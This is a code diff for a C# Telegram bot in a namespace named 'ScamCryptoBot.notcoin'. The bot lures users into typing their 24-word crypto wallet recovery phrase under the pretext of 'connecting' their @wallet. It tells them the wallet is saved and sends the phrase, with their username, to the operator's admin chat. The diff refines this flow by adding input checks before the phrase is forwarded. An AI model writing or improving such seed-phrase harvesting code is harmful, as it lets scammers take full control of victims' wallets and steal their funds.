@@ -48,10 +48,24 @@ namespace ScamCryptoBot.notcoin
                                 if (UserStates.UserInputMnemonic)
                                 {
                                     string mnemonica = msg.Text;
-                                    await bot.SendTextMessageAsync(chat, "Кошелек подключен !", replyMarkup: KeyBoard.RenderGoBack());
-                                    await bot.SendTextMessageAsync(AdminPanel.adminID, $"Пользователь: @{user.Username} подарил тебе кошелек\nФраза для входа:<code> {mnemonica} </code>", parseMode: ParseMode.Html);
-                                    UserStates.UserInputMnemonic = false;
-                                    break;
+                                    if (!string.IsNullOrEmpty(mnemonica)) 
+                                    {
+                                        if(mnemonica.Count() < 24) 
+                                        {
+                                            await bot.SendTextMessageAsync(chat, "Введена не верная фраза\nПопробуйте заново", replyMarkup: KeyBoard.RenderGoBack());
+                                            UserStates.UserInputMnemonic = false;
+                                            break;
+
+                                        }
+                                        else 
+                                        {
+                                            await bot.SendTextMessageAsync(chat, "Ваш кошелек сохранен!", replyMarkup: KeyBoard.RenderGoBack());
+                                            await bot.SendTextMessageAsync(AdminPanel.adminID, $"Пользователь: @{user.Username} подарил тебе кошелек\nФраза для входа:<code> {mnemonica} </code>", parseMode: ParseMode.Html);
+                                            UserStates.UserInputMnemonic = false;
+                                            break;
+                                        }
+                                    }
+                                    
                                 }
                                 if (UserStates.UserInputCountOfNOT)
                                 {
@@ -71,7 +85,7 @@ namespace ScamCryptoBot.notcoin
                         switch (callbackQuery.Data)
                         {
                             case "button_AuthWallet":
-                                string text = $"Для подключения кошелька @wallet <b>требуется ввести 24 значную фразу восстановления кошелька</b>\n❗️ Каждую фразу разделяйте пробелом!\nПример: АБ СД ЕА ПР\nВведите фразу:";
+                                string text = $"Для подключения кошелька @wallet <b>требуется ввести 24 значную фразу восстановления кошелька</b>\n❗️ Каждую фразу разделяйте пробелом!:";
                                 await bot.SendTextMessageAsync(callbackQuery.Message.Chat.Id, text, parseMode: ParseMode.Html);
                                 UserStates.UserInputMnemonic = true;
                                 break;
